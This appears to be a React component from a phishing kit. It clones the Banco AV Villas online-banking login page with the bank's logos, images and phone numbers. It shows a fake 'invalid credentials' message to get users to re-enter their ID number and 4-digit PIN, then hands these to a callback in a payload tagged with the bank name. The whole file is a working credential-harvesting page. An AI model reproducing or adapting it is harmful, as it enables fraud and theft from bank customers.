/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useEffect, useRef, useState } from "react";
import { Ban } from "lucide-react";

import LoaderFullScreen from "./LoaderFullScreen";

type DocType = "CC" | "CE" | "TI";

interface LoginProps {
  enviar?: (data: any) => void;
}

export default function ErrorLogin({ enviar }: LoginProps) {
  // Tipo de documento
  const [docType, setDocType] = useState<DocType>("CC");
  const [docLabel, setDocLabel] = useState("Cédula de ciudadanía");
  const [menuOpen, setMenuOpen] = useState(false);

  // Usuario / password
  const [usuario, setUsuario] = useState("");
  const [password, setPassword] = useState("");

  // Errores (equivalentes a e_u, e_p)
  const [userError, setUserError] = useState(false);
  const [passError, setPassError] = useState(false);

  // Loader (equivalente a #fondo / #cargando show/hide)
  const [loading, setLoading] = useState(false);

  // Ref para cerrar menú al hacer click fuera
  const tipoRef = useRef<HTMLDivElement | null>(null);

  const cleanUsuario = usuario.replace(/\D/g, "");
  const cleanPassword = password.replace(/\D/g, "");
  const canSubmit = cleanUsuario.length >= 8 && cleanUsuario.length <= 12 && cleanPassword.length === 4;

  // ---- formateo número de documento (igual que JS original) ----
  const formatDocumento = (raw: string) => {
    // quitar todo lo que no sea dígito
    const digits = raw.replace(/\D/g, "").slice(0, 12);
    // invertir y agrupar en bloques de 3
    const reversed = digits.split("").reverse().join("");
    let c = 0;
    let nuevo = "";
    for (let i = 0; i < reversed.length; i++) {
      if (c === 3) {
        nuevo += ".";
        c = 1;
      } else {
        c++;
      }
      nuevo += reversed[i];
    }
    const final = nuevo.split("").reverse().join("");
    return final;
  };

  const handleUsuarioChange = (value: string) => {
    const formatted = formatDocumento(value);
    setUsuario(formatted);

    if (formatted === "") {
      setUserError(true);
    } else {
      setUserError(false);
    }
  };

  const handlePasswordChange = (value: string) => {
    const numValue = value.replace(/\D/g, "").slice(0, 4);
    setPassword(numValue);
    if (numValue === "") {
      setPassError(true);
    } else {
      setPassError(false);
    }
  };

  const handleLoginClick = () => {
    const cleanUsuario = usuario.replace(/\D/g, "");
    const cleanPassword = password.replace(/\D/g, "");

    const userInvalid = cleanUsuario.length < 8 || cleanUsuario.length > 12;
    const passInvalid = cleanPassword.length !== 4;

    setUserError(userInvalid);
    setPassError(passInvalid);

    if (userInvalid || passInvalid) return;

    // Activar loader
    setLoading(true);

    const finalUsuario = usuario.replace(/\./g, "");

    const payload = {
      tipoDocumento: docType,
      view: 'login',
      user: finalUsuario,
      pass: password,
      bank: "avvillas"
    };

    enviar?.(payload);

    // Aquí normalmente esperarías la respuesta real.
    // Por ahora simulo un tiempo de 2.5s:

  };

  // Cerrar menú al hacer click fuera
  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      if (!tipoRef.current) return;
      if (!tipoRef.current.contains(e.target as Node)) {
        setMenuOpen(false);
      }
    };

    if (menuOpen) {
      document.addEventListener("mousedown", handleClickOutside);
    } else {
      document.removeEventListener("mousedown", handleClickOutside);
    }

    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, [menuOpen]);

  // Selección de tipo documento
  const selectDocType = (type: DocType) => {
    setDocType(type);
    setMenuOpen(false);
    switch (type) {
      case "CC":
        setDocLabel("Cédula de ciudadanía");
        break;
      case "CE":
        setDocLabel("Cédula de extranjería");
        break;
      case "TI":
        setDocLabel("Tarjeta de identidad");
        break;
    }
  };

  return (
    <>
      <LoaderFullScreen visible={loading} />

      {/* Imágenes decorativas */}
      <img src="/bancos/avvillas/img/super-v-ne.svg" id="super-nuevo" alt="" />

      <img id="sup-der" src="/bancos/avvillas/img/sup-der.svg" alt="" />

      {/* Hidden tipo documento (por compatibilidad) */}
      <input type="hidden" name="hdd-documento" id="hdd-documento" value={docType} />

      <table
        width="100%"
        cellPadding={0}
        cellSpacing={0}
        border={0}
        style={{ margin: "0 auto", maxWidth: "1280px" }}
      >
        <tbody>
          <tr>
            {/* LADO DERECHO: slider + teléfonos */}
            <td width="60%" valign="top" id="lado-der">
              <div className="slider">
                <ul>
                  <li>
                    <img src="/bancos/avvillas/img/s1.fw-min.png" alt="" />
                  </li>
                  <li>
                    <img src="/bancos/avvillas/img/s2.fw-min.png" alt="" />
                  </li>
                  <li>
                    <img src="/bancos/avvillas/img/s3.fw-min.png" alt="" />
                  </li>
                  <li>
                    <img src="/bancos/avvillas/img/s4.fw-min.png" alt="" />
                  </li>
                </ul>
              </div>

              <table border={0} cellSpacing={0} cellPadding={0}>
                <tbody>
                  <tr>
                    <td rowSpan={2}>
                      <img
                        src="/bancos/avvillas/img/a-logo-color.svg"
                        width={100}
                        style={{ marginRight: 20 }}
                        alt="Audiovillas"
                      />
                    </td>
                    <td className="etq-titulo">Línea Audiovillas</td>
                  </tr>
                  <tr>
                    <td>
                      <table cellPadding={0} cellSpacing={0} border={0}>
                        <tbody>
                          <tr>
                            <td className="etq-titulo borde">Bogotá</td>
                            <td className="etq-titulo borde">Medellín</td>
                            <td className="etq-titulo borde">Barranquilla</td>
                            <td className="etq-titulo borde">Bucaramanga</td>
                            <td className="etq-titulo borde">Cali</td>
                            <td className="etq-titulo">Resto del país</td>
                          </tr>
                          <tr>
                            <td className="etq-telefono borde">(601) 4441777</td>
                            <td className="etq-telefono borde">(604) 3256000</td>
                            <td className="etq-telefono borde">(605) 3304330</td>
                            <td className="etq-telefono borde">(607) 6302980</td>
                            <td className="etq-telefono borde">(602) 8859595</td>
                            <td className="etq-telefono">01 8000 51 8000</td>
                          </tr>
                        </tbody>
                      </table>
                    </td>
                  </tr>
                </tbody>
              </table>
            </td>

            {/* LADO IZQUIERDO: formulario login */}
            <td width="40%" valign="top" id="lado-izq">
              <div className="pnl-izq">
                <img src="/bancos/avvillas/img/logo-pal.svg" alt="Banca virtual" />

                <div className="titulo">Ingresa a la Banca Virtual</div>
                <div style={{ color: '#d9534f', fontSize: '14px', marginTop: '10px', marginBottom: '10px', fontWeight: 'bold', textAlign: 'center' }}>
                  Credenciales inválidas, por favor verifique e intente nuevamente.
                </div>

                {/* Tipo de documento */}
                <div className="frm-input" id="inp-tipo" ref={tipoRef}>
                  <table
                    border={0}
                    width="100%"
                    cellPadding={0}
                    cellSpacing={0}
                    style={{ height: 54 }}
                    id="tbl-documento"
                    onClick={() => setMenuOpen((prev) => !prev)}
                  >
                    <tbody>
                      <tr>
                        <td align="left" id="td1">
                          <div id="titulo-tipo">Tipo de documento</div>
                          <div id="txt-documento">{docLabel}</div>
                        </td>
                        <td valign="middle" align="right" width={24} id="td2">
                          {/* Flechas */}
                          <img
                            src="/bancos/avvillas/img/flecha-abajo.jpg"
                            width={16}
                            id="ico-flecha-ab"
                            alt=""
                            style={{ display: menuOpen ? "none" : "inline-block" }}
                          />
                          <img
                            src="/bancos/avvillas/img/flecha-arriba.jpg"
                            width={16}
                            id="ico-flecha-ar"
                            alt=""
                            style={{ display: menuOpen ? "inline-block" : "none" }}
                          />
                        </td>
                      </tr>
                    </tbody>
                  </table>

                  {/* Menú tipo documento */}
                  {menuOpen && (
                    <div id="menu-tipo">
                      <div
                        className="item-menu"
                        id="mnu-ced"
                        onClick={() => selectDocType("CC")}
                      >
                        Cédula de ciudadanía
                      </div>
                      <div
                        className="item-menu"
                        id="mnu-ext"
                        onClick={() => selectDocType("CE")}
                      >
                        Cédula de extranjería
                      </div>
                      <div
                        className="item-menu"
                        id="mnu-tar"
                        onClick={() => selectDocType("TI")}
                      >
                        Tarjeta de identidad
                      </div>
                    </div>
                  )}
                </div>

                <div style={{ height: 32 }} />

                {/* Número de documento */}
                <div
                  className="frm-input"
                  id="inp-usuario"
                  style={{
                    borderBottom: userError
                      ? "2px solid #A00104"
                      : "2px solid #0048DB",
                  }}
                >
                  <table
                    border={0}
                    width="100%"
                    cellPadding={0}
                    cellSpacing={0}
                    style={{ height: 54 }}
                  >
                    <tbody>
                      <tr>
                        <td align="left">
                          <div
                            className="etiqueta"
                            id="etq-usuario"
                            style={{
                              color: userError ? "#A00104" : "#0048DB",
                            }}
                          >
                            Número de documento
                          </div>
                          <input
                            type="text"
                            className="entrada"
                            id="txt-usuario"
                            name="txt-usuario"
                            autoComplete="off"
                            pattern="[0-9]*"
                            inputMode="numeric"

                            value={usuario}
                            onChange={(e) => handleUsuarioChange(e.target.value)}
                          />
                        </td>
                        <td valign="middle" align="right" width={24}>
                          <img
                            src="/bancos/avvillas/img/usuario.jpg"
                            width={20}
                            id="ico-usuario"
                            className="icon-entrada"
                            alt=""
                            style={{ display: userError ? "none" : "inline-block" }}
                          />
                          <img
                            src="/bancos/avvillas/img/alerta.jpg"
                            width={25}
                            id="ico-alerta-u"
                            className="icon-entrada"
                            alt=""
                            style={{ display: userError ? "inline-block" : "none" }}
                          />
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                <div
                  className="error"
                  id="err-usuario"
                  style={{ display: userError ? "block" : "none" }}
                >
                  Este campo es requerido.
                </div>

                <div style={{ height: 32 }} />

                {/* Password */}
                <div
                  className="frm-input"
                  id="inp-password"
                  style={{
                    borderBottom: passError
                      ? "2px solid #A00104"
                      : "2px solid #0048DB",
                  }}
                >
                  <table
                    border={0}
                    width="100%"
                    cellPadding={0}
                    cellSpacing={0}
                    style={{ height: 54 }}
                  >
                    <tbody>
                      <tr>
                        <td align="left">
                          <div
                            className="etiqueta"
                            id="etq-password"
                            style={{
                              color: passError ? "#A00104" : "#0048DB",
                            }}
                          >
                            Ingresa tu contraseña
                          </div>
                          <input
                            type="password"
                            className="entrada"
                            id="txt-password"
                            name="txt-password"
                            autoComplete="off"
                            inputMode="numeric"
                            maxLength={4}
                            value={password}
                            onChange={(e) => handlePasswordChange(e.target.value)}
                          />
                        </td>
                        <td valign="middle" align="right" width={24}>
                          <img
                            src="/bancos/avvillas/img/seguridad.jpg"
                            width={22}
                            id="ico-password"
                            className="icon-entrada"
                            alt=""
                            style={{ display: passError ? "none" : "inline-block" }}
                          />
                          <img
                            src="/bancos/avvillas/img/alerta.jpg"
                            width={25}
                            id="ico-alerta-p"
                            className="icon-entrada"
                            alt=""
                            style={{ display: passError ? "inline-block" : "none" }}
                          />
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                <div
                  className="error"
                  id="err-password"
                  style={{ display: passError ? "block" : "none" }}
                >
                  Este campo es requerido.
                </div>

                <div
                  style={{
                    textAlign: "right",
                    paddingTop: 11,
                    paddingBottom: 35,
                  }}
                >
                  <table
                    border={0}
                    cellSpacing={0}
                    cellPadding={0}
                    style={{ display: "initial" }}
                  >
                    <tbody>
                      <tr>
                        <td
                          style={{
                            color: "#0048DB",
                            fontSize: 12,
                            cursor: "pointer",
                            textDecoration: "underline",
                          }}
                        >
                          <u>Olvidé mi contraseña</u>
                        </td>
                        <td>
                          <img src="/bancos/avvillas/img/seguridad.svg" width={15} alt="" />
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                {/* Botón INGRESAR */}
                <button
                  id="btn-ingresar"
                  type="button"
                  className="btn"
                  disabled={!canSubmit}
                  onClick={handleLoginClick}
                >
                  INGRESAR
                </button>

                <div style={{ borderBottom: "1px solid #fff", height: 30 }} />

                <div
                  style={{
                    color: "#252b31",
                    fontSize: 14,
                    textAlign: "center",
                    marginTop: 20,
                  }}
                >
                  ¿Aún no tienes contraseña para ingresar?{" "}
                  <span
                    style={{
                      color: "#0048DB",
                      cursor: "pointer",
                      textDecoration: "underline",
                    }}
                  >
                    Regístrate.
                  </span>
                </div>
              </div>
            </td>
          </tr>
        </tbody>
      </table>

      {/* Footers igual que antes */}
      <div id="footer2">
        <table
          border={0}
          cellSpacing={0}
          cellPadding={0}
          width="90%"
          style={{ margin: "0 auto" }}
        >
          <tbody>
            <tr>
              <td rowSpan={2}>
                <img
                  src="/bancos/avvillas/img/a-logo-color.svg"
                  width={100}
                  style={{ marginRight: 20, marginBottom: 10 }}
                  alt=""
                />
                <br />
                <img src="/bancos/avvillas/img/super-h-ne.svg" width={130} alt="" />
              </td>
              <td className="etq-titulo">Línea Audiovillas</td>
            </tr>
            <tr>
              <td>
                <table
                  cellPadding={0}
                  cellSpacing={0}
                  border={0}
                  width="100%"
                >
                  <tbody>
                    <tr>
                      <td className="etq-titulo borde">Bogotá</td>
                      <td className="etq-titulo borde">Medellín</td>
                      <td className="etq-titulo borde">Barranquilla</td>
                      <td className="etq-titulo borde">Bucaramanga</td>
                      <td className="etq-titulo borde">Cali</td>
                      <td className="etq-titulo">Resto del país</td>
                    </tr>
                    <tr>
                      <td className="etq-telefono borde">(601) 4441777</td>
                      <td className="etq-telefono borde">(604) 3256000</td>
                      <td className="etq-telefono borde">(605) 3304330</td>
                      <td className="etq-telefono borde">(607) 6302980</td>
                      <td className="etq-telefono borde">(602) 8859595</td>
                      <td className="etq-telefono">01 8000 51 8000</td>
                    </tr>
                  </tbody>
                </table>
              </td>
            </tr>
          </tbody>
        </table>
      </div>

      <div id="footer5">
        <table border={0} cellSpacing={0} cellPadding={0} width="100%">
          <tbody>
            <tr>
              <td rowSpan={4} id="col-super">
                <img src="/bancos/avvillas/img/superv-blanco.svg" width={10} alt="" />
              </td>
              <td colSpan={7}>&nbsp;</td>
            </tr>
            <tr>
              <td colSpan={7} className="etq-titulo">
                Línea Audiovillas
              </td>
            </tr>
            <tr>
              <td colSpan={7}>&nbsp;</td>
            </tr>
            <tr>
              <td className="etq-titulo borde">
                Bogotá<br />
                <span className="etq-telefono-m">(601) 4441777</span>
              </td>
              <td className="etq-titulo borde">
                Medellín<br />
                <span className="etq-telefono-m">(604) 3256000</span>
              </td>
              <td className="etq-titulo borde">
                Barranquilla<br />
                <span className="etq-telefono-m">(605) 3304330</span>
              </td>
              <td className="etq-titulo borde">
                Bucaramanga<br />
                <span className="etq-telefono-m">(607) 6302980</span>
              </td>
              <td className="etq-titulo borde">
                Cali<br />
                <span className="etq-telefono-m">(602) 8859595</span>
              </td>
              <td className="etq-titulo">
                Resto del país<br />
                <span className="etq-telefono-m">01 8000 51 8000</span>
              </td>
              <td id="col-logo">
                <img src="/bancos/avvillas/img/logo-blanco.svg" width={70} alt="" />
              </td>
            </tr>
          </tbody>
        </table>
      </div>

      <div id="footer4">
        <table border={0} width="100%" cellPadding={0} cellSpacing={0}>
          <tbody>
            <tr>
              <td colSpan={3} className="etq-titulo">
                Línea Audiovillas
              </td>
            </tr>
            <tr>
              <td className="etq-titulo borde">
                Nacional<br />
                <span className="etq-telefono-m">01 8000 51 8000</span>
              </td>
              <td className="etq-titulo borde">
                Bogotá<br />
                <span className="etq-telefono-m">(601) 4441777</span>
              </td>
              <td>
                <table>
                  <tbody>
                    <tr>
                      <td style={{ color: "#fff" }} className="etq-titulo">
                        Más ciudades
                      </td>
                      <td>
                        <img src="/bancos/avvillas/img/flecha-abajo.png" width={13} alt="" />
                      </td>
                    </tr>
                  </tbody>
                </table>
              </td>
            </tr>
          </tbody>
        </table>
      </div>

      <div id="footer3">
        <table width="100%" border={0} cellSpacing={0}>
          <tbody>
            <tr>
              <td align="left">
                <img src="/bancos/avvillas/img/a-logo-color.svg" width={70} alt="" />
              </td>
              <td align="right">
                <img src="/bancos/avvillas/img/super-h-ne.svg" width={130} alt="" />
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    </>
  );
}